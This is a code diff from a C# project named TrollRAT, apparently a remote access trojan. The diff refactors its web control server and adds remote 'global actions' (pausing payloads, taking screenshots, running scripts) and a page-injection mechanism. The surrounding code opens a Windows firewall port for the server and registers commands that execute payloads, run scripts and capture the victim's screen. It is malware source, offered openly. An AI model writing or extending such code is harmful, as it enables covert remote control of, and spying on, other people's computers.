@@ -2,10 +2,14 @@
 using System.Collections.Generic;
 using System.Text;
 using System.Net;
+using System.Linq;
 using System.Text.RegularExpressions;
 
 using TrollRAT.Payloads;
 using TrollRAT.Utils;
+using TrollRAT.Actions;
+using TrollRAT.Server.Injections;
+using System.Reflection;
 
 namespace TrollRAT.Server
 {
@@ -31,11 +35,12 @@ namespace TrollRAT.Server
 
     public abstract class WebServerCommand : WebServerCommandBase
     {
-        protected List<Payload> payloads;
+        protected WebServer server;
+        public WebServer Server => server;
 
-        public WebServerCommand(List<Payload> payloads)
+        public WebServerCommand(WebServer server)
         {
-            this.payloads = payloads;
+            this.server = server;
         }
     }
 
@@ -92,28 +97,62 @@ namespace TrollRAT.Server
 
     public class WebServer : WebServerBase
     {
-        private List<Payload> payloads = new List<Payload>();
+        protected List<Payload> payloads = new List<Payload>();
         public List<Payload> Payloads => payloads;
+
+        protected List<GlobalAction> actions = new List<GlobalAction>();
+        public List<GlobalAction> Actions => actions;
+
+        internal Dictionary<string, List<string>> injections = new Dictionary<string, List<string>>();
 
         public WebServer(int port) : base(port)
         {
             Firewall.openPort("TrollRAT", port, NetFwTypeLib.NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP);
 
-            commands.Add(new RootCommand());
-            commands.Add(new PayloadsCommand(payloads));
+            initInjections();
+
+            addInjection(InjectionPlaceholders.SCRIPT, ResourceUtil.getResourceString("TrollRAT.Web.JS.main.js"));
+            addInjection(InjectionPlaceholders.SCRIPT, ResourceUtil.getResourceString("TrollRAT.Web.JS.gaia.js"));
+
+            addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.about.html"));
+            addInjection(InjectionPlaceholders.BODY, ResourceUtil.getResourceString("TrollRAT.Web.HTML.yesNo.html"));
+
+            commands.Add(new RootCommand(this));
+            commands.Add(new PayloadsCommand(this));
+            commands.Add(new GlobalActionsCommand(this));
+
             commands.Add(new AboutCommand());
 
-            commands.Add(new SettingsCommand(payloads));
-            commands.Add(new ActionsCommand(payloads));
+            commands.Add(new SettingsCommand(this));
+            commands.Add(new ActionsCommand(this));
+            commands.Add(new GlobalActionCommand(this));
 
-            commands.Add(new ExecuteCommand(payloads));
-            commands.Add(new SetCommand(payloads));
+            commands.Add(new ExecuteCommand(this));
+            commands.Add(new SetCommand(this));
 
             commands.Add(new RunScriptCommand());
             commands.Add(new ScreenshotCommand());
 
             commands.Add(new GenerateCodeCommand());
             commands.Add(new UseCodeCommand());
+
+            actions.Add(new GlobalActionPausePayloads(this));
+            actions.Add(new GlobalActionShareCodeManager(this));
+            actions.Add(new GlobalActionScreenshot(this));
+            actions.Add(new GlobalActionRunScript(this));
+        }
+
+        private void initInjections()
+        {
+            foreach (string placeholder in (
+                from FieldInfo info in typeof(InjectionPlaceholders).GetFields()
+                select info.GetValue(null)))
+                injections.Add(placeholder, new List<string>());
+        }
+
+        public void addInjection(string placeholder, string insertion)
+        {
+            injections[placeholder].Add(insertion);
         }
     }
 }
